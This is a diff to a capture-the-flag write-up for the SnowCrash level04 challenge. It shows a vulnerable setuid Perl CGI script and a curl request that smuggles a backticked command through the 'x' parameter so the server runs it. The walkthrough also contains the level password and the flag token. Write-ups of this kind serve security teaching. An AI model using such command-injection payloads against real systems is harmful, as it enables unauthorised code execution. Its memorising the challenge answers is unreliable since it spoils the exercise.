@@ -1,11 +1,12 @@
-level03@SnowCrash:~$ PATH=/bin
 level03@SnowCrash:~$ su level04
 Password: qi0maab88jeaj46qoumi7maus
 
 level04@SnowCrash:~$ ls -l
 -rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
 
+********************************************************************************
 Again the ’s’ in the rights.
+********************************************************************************
 
 level04@SnowCrash:~$ cat level04.pl
 #!/usr/bin/perl
@@ -18,9 +19,12 @@ sub x {
 }
 x(param("x"));
 
-We need to listen on the port 4747 with curl -I to include the http header.
+********************************************************************************
+We can see with top that the script is already running.
+We need to listen on the port 4747 with curl -i to include the http header.
+********************************************************************************
 
-level04@SnowCrash:~$ curl -i 192.168.0.22:4747
+level04@SnowCrash:~$ curl -i ip:4747
 HTTP/1.1 200 OK
 Date: Fri, 08 Oct 2021 00:02:27 GMT
 Server: Apache/2.2.22 (Ubuntu)
@@ -28,12 +32,16 @@ Vary: Accept-Encoding
 Content-Length: 1
 Content-Type: text/html
 
+********************************************************************************
 We pass a variable x to see the echo in action :
+********************************************************************************
 
-level04@SnowCrash:~$ curl 192.168.0.22:4747?x=toto
+level04@SnowCrash:~$ curl ip:4747?x=toto
 toto
 
+********************************************************************************
 So we will pass a command between `` to make echo execute it.
+********************************************************************************
 
-level04@SnowCrash:~$ curl 192.168.0.22:4747?x="\`getflag\`"
+level04@SnowCrash:~$ curl ip:4747?x="\`getflag\`"
 Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
